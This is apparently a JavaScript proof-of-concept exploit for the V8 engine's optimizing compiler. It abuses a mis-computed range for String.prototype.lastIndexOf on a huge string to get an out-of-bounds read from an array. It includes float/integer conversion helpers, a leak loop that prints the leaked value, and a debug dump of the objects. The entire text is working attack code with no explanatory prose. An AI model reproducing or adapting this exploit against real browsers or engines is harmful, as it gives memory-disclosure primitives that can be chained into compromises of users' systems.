let ab = new ArrayBuffer(8);
let fv = new Float64Array(ab);
let dv = new BigUint64Array(ab);

let f2i = (f) => {
    fv[0] = f;
      return dv[0];
}

let i2f = (i) => {
    dv[0] = BigInt(i);
      return fv[0];
}

let hexprintablei = (i) => {
    return (i).toString(16).padStart(16,"0");
}

SUCCESS = 0;
FAILURE = 1;

const str = "____"+"DOARE".repeat(214748359);
function opt_me() {
  const OOB_OFFSET = 9;
  let idx = String.prototype.lastIndexOf.call(str, ''); // JSCall | Range(-1, 1073741798)
  let val = Math.abs(Math.abs(idx) + 25); 
  val = val >> 30;
  val = val * OOB_OFFSET;
  let leak = 0;
  if (val >= OOB_OFFSET)
    leak = 0;
  else {
    var arr = new Array(1.1,1.1);
    arr2 = new Array(1.1,1.1);
    leak = arr[val];
    if (leak != 1.1 && leak != 0 && leak != undefined) {
      print("[+] leaking " + hexprintablei(f2i(leak)));
      %DumpObjects(arr,20|3);
      return SUCCESS;
    }
  }
  return FAILURE;
}

for (var i = 0; i < 0x10000; ++i) {
  var ret = opt_me();
  if (ret == SUCCESS)
    break;
}
